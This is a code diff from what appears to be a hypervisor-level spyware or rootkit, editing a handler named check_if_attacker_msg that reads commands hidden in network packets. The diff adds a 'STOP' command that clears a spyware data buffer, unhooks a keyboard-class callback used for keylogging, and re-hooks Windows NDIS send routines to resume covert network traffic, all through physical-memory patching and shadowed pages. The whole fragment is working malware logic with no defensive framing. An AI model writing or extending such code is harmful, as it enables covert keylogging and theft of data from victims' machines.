@@ -168,13 +168,24 @@ void check_if_attacker_msg(byte_t *pkt){
         hook_function(guest_virtual_to_physical(shared_cores_data.kbdclass + KBDCLASS_KeyboardClassServiceCallback_OFFSET), &shared_cores_data.memory_shadowing_pages.KeyboardClassServiceCallback_x, shared_cores_data.memory_shadowing_pages.KeyboardClassServiceCallback_rw);
         
         // remove the receive hook
-        *(uint16_t*)guest_virtual_to_physical(shared_cores_data.ndis + NDIS_NdisMIndicateReceiveNetBufferLists_OFFSET) = PUSH_R12;
+        // *(uint16_t*)guest_virtual_to_physical(shared_cores_data.ndis + NDIS_NdisMIndicateReceiveNetBufferLists_OFFSET) = PUSH_R12;
     }
-    // else if (memcmp(payload, "NOPE", 5)){
-    //     // Activate sending for scan
-    //     // shared_cores_data.send_requests = TRUE;
-    //     // hook_function(guest_virtual_to_physical(shared_cores_data.ndis + NDIS_ndisMSendNBLToMiniportInternal_OFFSET));
-    // }
+    else if (memcmp(payload, "STOP", 5)){
+        
+        // Clear spyware buffer
+        AcquireLock(&shared_cores_data.spyware_data_lock);
+        shared_cores_data.spyware_data_buffer.length = 0;
+        shared_cores_data.send_pending = FALSE;
+        ReleaseLock(&shared_cores_data.spyware_data_lock);
+
+        // Remove keyboard hook
+        *(uint8_t*)guest_virtual_to_physical(shared_cores_data.kbdclass + KBDCLASS_KeyboardClassServiceCallback_OFFSET) = PUSH_RBP;
+
+        // Start sending requests again
+        shared_cores_data.send_requests = TRUE;
+        hook_function(guest_virtual_to_physical(shared_cores_data.ndis + NDIS_ndisMSendNBLToMiniportInternal_OFFSET), &shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_x, shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_rw);
+
+    }
 
 }
 
